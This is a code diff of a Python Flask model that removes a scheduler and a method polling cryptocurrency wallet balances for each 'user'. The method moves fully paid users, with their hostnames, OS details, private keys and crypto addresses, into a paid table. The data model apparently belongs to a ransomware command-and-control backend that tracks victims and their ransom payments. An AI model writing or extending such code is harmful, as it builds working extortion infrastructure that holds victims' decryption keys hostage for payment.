@@ -50,45 +50,6 @@ class Users(db.Model):
     def __repr__(self):
         return f'<UID {self.uid}>'
 
-    def schedule_termination(self):
-        scheduler = BackgroundScheduler()
-        scheduler.add_job(self.monitor_payments, 'interval', seconds=30)
-        scheduler.start()
-
-    def monitor_payments(self):
-        with app.app_context():
-            users = Users.query.all()  # fetch all users
-            for user in users:
-                try:
-                    balance = wallet_api(user.crypto_address)
-                    if balance > 0:
-                        user.amount_paid = balance
-                        if user.amount_paid >= user.total_payment and not user.status:
-                            user.status = True
-                            paid_user = UsersPaid(
-                                username=user.username,
-                                hostname=user.hostname,
-                                uid=user.uid,
-                                os_name=user.os_name,
-                                os_version=user.os_version,
-                                os_architecture=user.os_architecture,
-                                email=user.email,
-                                public_key=user.public_key,
-                                private_key=user.private_key,
-                                crypto_address=user.crypto_address,
-                                total_payment=user.total_payment,
-                                status=True,
-                                amount_paid=user.amount_paid,
-                                creation_date=user.creation_date,
-                                payment_date=datetime.now(tz=tz)
-                            )
-                            db.session.add(paid_user)
-                            db.session.delete(user)
-
-                except Exception as e:
-                    print(e)
-            db.session.commit()
-
 
 class UsersPaid(db.Model):
     id = db.Column(db.Integer, primary_key=True)
